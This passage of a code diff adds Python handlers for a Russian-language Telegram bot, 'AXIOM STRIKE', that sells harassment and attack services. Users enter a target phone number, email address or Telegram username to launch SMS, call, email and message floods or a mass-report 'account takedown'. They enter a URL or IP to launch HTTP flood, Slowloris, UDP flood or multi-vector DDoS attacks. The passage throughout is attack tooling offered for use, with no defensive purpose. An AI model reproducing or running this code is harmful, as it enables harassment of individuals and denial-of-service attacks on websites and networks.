+            results = await self.destroyer.spam_flood(username, count, update_progress)
+        else:
+            results = await self.destroyer.destroy_account(username, count, update_progress)
+
+        success = sum(1 for r in results if r['status'] == 'sent')
+
+        await status_msg.edit_text(
+            f"💀 **Снос аккаунта {username} завершён!**\n\n"
+            f"📊 Отправлено: {len(results)}\n"
+            f"✅ Успешно: {success}\n"
+            f"❌ Ошибок: {len(results) - success}\n"
+            f"⏱ Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
+            f"🔥 Аккаунт будет заблокирован в ближайшее время!",
+            reply_markup=self.main_keyboard()
+        )
+
+    # ========== ОБРАБОТЧИКИ БОМБЕРА ==========
+    async def handle_sms_bomber(self, message: types.Message, state: FSMContext):
+        await state.set_state(BomberStates.waiting_for_phone)
+        await message.answer(
+            "📱 **СМС БОМБЕР**\n\n"
+            "Введите номер телефона:\n"
+            "📝 Пример: +79001234567"
+        )
+
+    async def process_sms_phone(self, message: types.Message, state: FSMContext):
+        phone = message.text.strip()
+        if not re.match(r'^\+?[0-9]{10,15}$', phone):
+            await message.answer("❌ Введите корректный номер!")
+            return
+        await state.update_data(phone=phone)
+        await state.set_state(BomberStates.waiting_for_sms_count)
+        await message.answer(
+            "📊 Введите количество сообщений (1-100):"
+        )
+
+    async def process_sms_count(self, message: types.Message, state: FSMContext):
+        try:
+            count = int(message.text.strip())
+            if count < 1 or count > 100:
+                await message.answer("❌ Введите число от 1 до 100!")
+                return
+        except:
+            await message.answer("❌ Введите число!")
+            return
+
+        data = await state.get_data()
+        phone = data.get('phone')
+        await state.clear()
+
+        status_msg = await message.answer(f"⏳ Запуск СМС бомбера...\n0/{count}")
+
+        async def update_progress(progress, current, total):
+            if current % 10 == 0 or current == total:
+                await status_msg.edit_text(f"⏳ Отправка СМС...\n{current}/{total} ({int(progress)}%)")
+
+        results = await self.sms_bomber.send_sms(phone, count, update_progress)
+
+        success = sum(1 for r in results if r['status'] == 'success')
+        errors = len(results) - success
+
+        await status_msg.edit_text(
+            f"✅ **СМС бомбер завершён!**\n\n"
+            f"📱 Номер: {phone}\n"
+            f"📊 Отправлено: {success}\n"
+            f"❌ Ошибок: {errors}\n"
+            f"📈 Всего попыток: {len(results)}\n"
+            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
+            reply_markup=self.bomber_keyboard()
+        )
+
+    async def handle_call_bomber(self, message: types.Message, state: FSMContext):
+        await state.set_state(BomberStates.waiting_for_phone)
+        await message.answer(
+            "📞 **ЗВОНКИ (ФЛУД)**\n\n"
+            "Введите номер телефона:\n"
+            "📝 Пример: +79001234567"
+        )
+
+    async def process_call_count(self, message: types.Message, state: FSMContext):
+        try:
+            count = int(message.text.strip())
+            if count < 1 or count > 20:
+                await message.answer("❌ Введите число от 1 до 20!")
+                return
+        except:
+            await message.answer("❌ Введите число!")
+            return
+
+        data = await state.get_data()
+        phone = data.get('phone')
+        await state.clear()
+
+        status_msg = await message.answer(f"⏳ Запуск звонков...\n0/{count}")
+
+        async def update_progress(current, total):
+            await status_msg.edit_text(f"⏳ Совершение звонков...\n{current}/{total}")
+
+        results = await self.call_bomber.make_calls(phone, count, update_progress)
+
+        success = sum(1 for r in results if r['status'] == 'success')
+
+        await status_msg.edit_text(
+            f"✅ **Звонки завершены!**\n\n"
+            f"📞 Номер: {phone}\n"
+            f"📊 Совершено: {success}\n"
+            f"❌ Ошибок: {len(results) - success}\n"
+            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
+            reply_markup=self.bomber_keyboard()
+        )
+
+    async def handle_email_bomber(self, message: types.Message, state: FSMContext):
+        await state.set_state(BomberStates.waiting_for_email)
+        await message.answer(
+            "📧 **EMAIL БОМБЕР**\n\n"
+            "Введите email адрес:\n"
+            "📝 Пример: example@gmail.com"
+        )
+
+    async def process_email(self, message: types.Message, state: FSMContext):
+        email = message.text.strip()
+        if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
+            await message.answer("❌ Введите корректный email!")
+            return
+        await state.update_data(email=email)
+        await state.set_state(BomberStates.waiting_for_email_count)
+        await message.answer("📊 Введите количество писем (1-50):")
+
+    async def process_email_count(self, message: types.Message, state: FSMContext):
+        try:
+            count = int(message.text.strip())
+            if count < 1 or count > 50:
+                await message.answer("❌ Введите число от 1 до 50!")
+                return
+        except:
+            await message.answer("❌ Введите число!")
+            return
+
+        data = await state.get_data()
+        email = data.get('email')
+        await state.clear()
+
+        status_msg = await message.answer(f"⏳ Запуск Email бомбера...\n0/{count}")
+
+        async def update_progress(current, total):
+            await status_msg.edit_text(f"⏳ Отправка писем...\n{current}/{total}")
+
+        results = await self.email_bomber.send_emails(email, count, update_progress)
+
+        success = sum(1 for r in results if r['status'] == 'sent')
+
+        await status_msg.edit_text(
+            f"✅ **Email бомбер завершён!**\n\n"
+            f"📧 Email: {email}\n"
+            f"📊 Отправлено: {success}\n"
+            f"❌ Ошибок: {len(results) - success}\n"
+            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
+            reply_markup=self.bomber_keyboard()
+        )
+
+    async def handle_telegram_bomber(self, message: types.Message, state: FSMContext):
+        await state.set_state(BomberStates.waiting_for_telegram)
+        await message.answer(
+            "📩 **TELEGRAM БОМБЕР**\n\n"
+            "Введите @username:\n"
+            "📝 Пример: @username123"
+        )
+
+    async def process_telegram(self, message: types.Message, state: FSMContext):
+        username = message.text.strip()
+        if not username.startswith('@'):
+            username = '@' + username
+        await state.update_data(username=username)
+        await state.set_state(BomberStates.waiting_for_telegram_count)
+        await message.answer("📊 Введите количество сообщений (1-30):")
+
+    async def process_telegram_count(self, message: types.Message, state: FSMContext):
+        try:
+            count = int(message.text.strip())
+            if count < 1 or count > 30:
+                await message.answer("❌ Введите число от 1 до 30!")
+                return
+        except:
+            await message.answer("❌ Введите число!")
+            return
+
+        data = await state.get_data()
+        username = data.get('username')
+        await state.clear()
+
+        status_msg = await message.answer(f"⏳ Запуск Telegram бомбера...\n0/{count}")
+
+        async def update_progress(current, total):
+            await status_msg.edit_text(f"⏳ Отправка сообщений...\n{current}/{total}")
+
+        results = await self.tg_bomber.send_messages(username, count, update_progress)
+
+        success = sum(1 for r in results if r['status'] == 'sent')
+
+        await status_msg.edit_text(
+            f"✅ **Telegram бомбер завершён!**\n\n"
+            f"📩 Пользователь: {username}\n"
+            f"📊 Отправлено: {success}\n"
+            f"❌ Ошибок: {len(results) - success}\n"
+            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
+            reply_markup=self.bomber_keyboard()
+        )
+
+    # ========== ОБРАБОТЧИКИ DDOS ==========
+    async def handle_http_flood(self, message: types.Message, state: FSMContext):
+        await state.set_state(DDoSStates.waiting_for_url)
+        await message.answer(
+            "🌐 **HTTP FLOOD**\n\n"
+            "Введите URL цели:\n"
+            "📝 Пример: https://example.com"
+        )
+
+    async def process_ddos_url(self, message: types.Message, state: FSMContext):
+        url = message.text.strip()
+        if not url.startswith(('http://', 'https://')):
+            url = 'https://' + url
+        await state.update_data(url=url)
+        await state.set_state(DDoSStates.waiting_for_threads)
+        await message.answer(
+            "⚡ Введите количество потоков (100-5000):"
+        )
+
+    async def process_ddos_threads(self, message: types.Message, state: FSMContext):
+        try:
+            threads = int(message.text.strip())
+            if threads < 100 or threads > 5000:
+                await message.answer("❌ Введите число от 100 до 5000!")
+                return
+        except:
+            await message.answer("❌ Введите число!")
+            return
+
+        await state.update_data(threads=threads)
+        await state.set_state(DDoSStates.waiting_for_duration)
+        await message.answer(
+            "⏱ Введите длительность в секундах (30-300):"
+        )
+
+    async def process_ddos_duration(self, message: types.Message, state: FSMContext):
+        try:
+            duration = int(message.text.strip())
+            if duration < 30 or duration > 300:
+                await message.answer("❌ Введите число от 30 до 300!")
+                return
+        except:
+            await message.answer("❌ Введите число!")
+            return
+
+        data = await state.get_data()
+        url = data.get('url')
+        threads = data.get('threads', 500)
+        await state.clear()
+
+        status_msg = await message.answer(
+            f"💣 **HTTP FLOOD запущена!**\n"
+            f"🌐 URL: {url}\n"
+            f"⚡ Потоков: {threads}\n"
+            f"⏱ Длительность: {duration}с\n"
+            f"⏳ Идёт атака..."
+        )
+
+        stats = await self.ddos_engine.http_flood(url, threads, duration, None)
+
+        await status_msg.edit_text(
+            f"💣 **HTTP FLOOD завершена!**\n\n"
+            f"🌐 URL: {url}\n"
+            f"📊 Запросов: {stats['requests']}\n"
+            f"✅ Успешно: {stats['success']}\n"
+            f"❌ Ошибок: {stats['errors']}\n"
+            f"📈 RPS: {stats['requests'] / duration:.1f}\n"
+            f"⏱ Длительность: {duration}с",
+            reply_markup=self.ddos_keyboard()
+        )
+
+    async def handle_slowloris(self, message: types.Message, state: FSMContext):
+        await state.set_state(DDoSStates.waiting_for_url)
+        await message.answer(
+            "🐌 **SLOWLORIS**\n\n"
+            "Введите URL цели:\n"
+            "📝 Пример: https://example.com"
+        )
+
+    async def process_ddos_ddos_duration(self, message: types.Message, state: FSMContext):
+        try:
+            duration = int(message.text.strip())
+            if duration < 60 or duration > 600:
+                await message.answer("❌ Введите число от 60 до 600!")
+                return
+        except:
+            await message.answer("❌ Введите число!")
+            return
+
+        data = await state.get_data()
+        url = data.get('url')
+        method = data.get('method', 'slowloris')
+        ip = data.get('ip')
+        port = data.get('port')
+        await state.clear()
+
+        status_msg = await message.answer(
+            f"💀 **{method.upper()} запущена!**\n"
+            f"⏳ Идёт атака..."
+        )
+
+        if method == 'slowloris':
+            stats = await self.ddos_engine.slowloris(url, duration, None)
+            result_text = (
+                f"🐌 **SLOWLORIS завершена!**\n\n"
+                f"🌐 URL: {url}\n"
+                f"📊 Соединений: {stats['connections']}\n"
+                f"🔄 Активных: {stats['active']}\n"
+                f"⏱ Длительность: {duration}с"
+            )
+        elif method == 'udp':
+            stats = await self.ddos_engine.udp_flood(ip, port, duration, None)
+            result_text = (
+                f"📡 **UDP FLOOD завершена!**\n\n"
+                f"🌐 IP: {ip}:{port}\n"
+                f"📦 Пакетов: {stats['packets']}\n"
+                f"💾 Байт: {stats['bytes']}\n"
+                f"⏱ Длительность: {duration}с"
+            )
+        elif method == 'multi':
+            stats = await self.ddos_engine.multi_vector(url, duration, None)
+            result_text = (
+                f"💀 **MULTI-VECTOR завершена!**\n\n"
+                f"🌐 URL: {url}\n"
+                f"📊 HTTP запросов: {stats['http']['requests']}\n"
+                f"🌐 HTTP успешно: {stats['http']['success']}\n"
+                f"🐌 Slowloris соединений: {stats['slowloris']['connections']}\n"
+                f"📦 UDP пакетов: {stats['udp']['packets']}\n"
+                f"💾 UDP байт: {stats['udp']['bytes']}\n"
+                f"⏱ Длительность: {duration}с"
+            )
+        else:
+            result_text = "❌ Неизвестный метод"
+
+        await status_msg.edit_text(result_text, reply_markup=self.ddos_keyboard())
+
+    async def handle_udp_flood(self, message: types.Message, state: FSMContext):
+        await state.set_state(DDoSStates.waiting_for_ip)
+        await message.answer(
+            "📡 **UDP FLOOD**\n\n"
+            "Введите IP:PORT цели:\n"
+            "📝 Пример: 192.168.1.1:80"
+        )
+
+    async def process_ddos_ip(self, message: types.Message, state: FSMContext):
+        try:
+            ip, port = message.text.strip().split(':')
+            port = int(port)
+        except:
+            await message.answer("❌ Введите в формате IP:PORT!")
+            return
+
+        await state.update_data(ip=ip, port=port, method='udp')
+        await state.set_state(DDoSStates.waiting_for_ddos_duration)
+        await message.answer("⏱ Введите длительность (30-120 сек):")
+
+    async def handle_multi_vector(self, message: types.Message, state: FSMContext):
+        await state.set_state(DDoSStates.waiting_for_url)
+        await state.update_data(method='multi')
+        await message.answer(
+            "💀 **MULTI-VECTOR**\n\n"
+            "Введите URL цели:\n"
+            "📝 Пример: https://example.com"
+        )
+
+    # ========== СТАТИСТИКА И НАСТРОЙКИ ==========
+    async def handle_stats(self, message: types.Message):
+        await message.answer(
+            "📊 **СТАТИСТИКА AXIOM STRIKE**\n\n"
+            f"📅 Дата: {datetime.now().strftime('%d.%m.%Y %H:%M')}\n"
+            f"📱 Бомбер: активен\n"
+            f"💣 DDoS: активен\n"
+            f"💀 Снос: активен\n"
+            f"⚡ Статус: ONLINE\n"
+            f"🔥 Версия: 4.0.0",
+            reply_markup=self.main_keyboard()
+        )
+
+    async def handle_settings(self, message: types.Message):
+        await message.answer(
+            "⚙️ **НАСТРОЙКИ**\n\n"
+            "🔹 Язык: Русский\n"
+            "🔹 Режим: Боевой\n"
+            "🔹 Уведомления: Включены\n"
+            "🔹 Логирование: Включено\n\n"
+            "📌 Для изменения настроек обратитесь к администратору.",
+            reply_markup=self.main_keyboard()
+        )
+
+    # ========== ЗАПУСК БОТА ==========
+    async def start(self):
+        logger.info("🔥 Запуск AXIOM STRIKE BOT...")
+        try:
+            await self.bot.get_me()
+            logger.info("✅ Подключение успешно!")
+            await self.dp.start_polling(self.bot)
+        except Exception as e:
+            logger.error(f"❌ Ошибка: {e}")
+            raise
+
+
+# ===================== ЗАПУСК =====================
+if __name__ == "__main__":
+    import re
+    if API_TOKEN == "ВСТАВИТЬ_ТОКЕН_СЮДА":
+        print("❌ Ошибка: Не установлен токен бота!")
+        exit(1)
+
+    try:
+        bot = AxiomStrikeBot(token=API_TOKEN)
+        asyncio.run(bot.start())
+    except KeyboardInterrupt:
+        print("\n⏹️ Бот остановлен")
+    except Exception as e:
+        print(f"❌ Ошибка: {e}")
+        logger.error(f"Критическая ошибка: {e}", exc_info=True)
